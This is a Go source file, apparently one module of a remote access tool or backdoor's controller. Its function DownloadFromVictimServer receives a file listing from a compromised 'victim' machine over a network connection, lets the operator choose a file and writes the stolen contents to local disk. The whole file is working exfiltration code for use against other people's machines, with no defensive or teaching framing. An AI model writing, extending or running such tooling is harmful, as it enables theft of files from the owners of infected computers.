package download

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func DownloadFromVictimServer(connection net.Conn) (err error) {
	filesStruct := &FilesList{}

	dec := gob.NewDecoder(connection)
	_ = dec.Decode(filesStruct)

	for index, fileName := range filesStruct.Files {
		fmt.Println("\t", index, "\t", fileName)
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[+] Select file : ")

	rawFileDownloadIndex, _ := reader.ReadString('\n')
	rawFileDownload := strings.TrimSuffix(rawFileDownloadIndex, "\n")

	fileIndex, _ := strconv.Atoi(rawFileDownload)

	FileName := filesStruct.Files[fileIndex]

	_, _ = connection.Write([]byte(FileName + "\n"))

	decoder := gob.NewDecoder(connection)
	fs := &Data{}

	_ = decoder.Decode(fs)

	file, _ := os.Create(fs.FileName)

	nbytes, err := file.Write(fs.FileContent)
	fmt.Println("[+] File downloaded successfully , ", nbytes)

	return
}
